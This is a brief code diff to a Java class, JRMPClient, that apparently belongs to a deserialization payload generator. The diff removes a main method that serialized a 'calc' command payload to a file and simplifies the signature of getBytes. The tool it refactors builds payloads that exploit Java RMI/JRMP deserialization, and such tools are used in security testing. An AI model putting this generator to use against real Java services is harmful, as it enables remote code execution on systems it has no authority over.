@@ -6,7 +6,6 @@ import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Proxy;
 import java.rmi.registry.Registry;
@@ -16,14 +15,7 @@ import java.util.Random;
 
 public class JRMPClient {
 
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
-
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         String command = String.valueOf(type);
         String host;
         int    port;
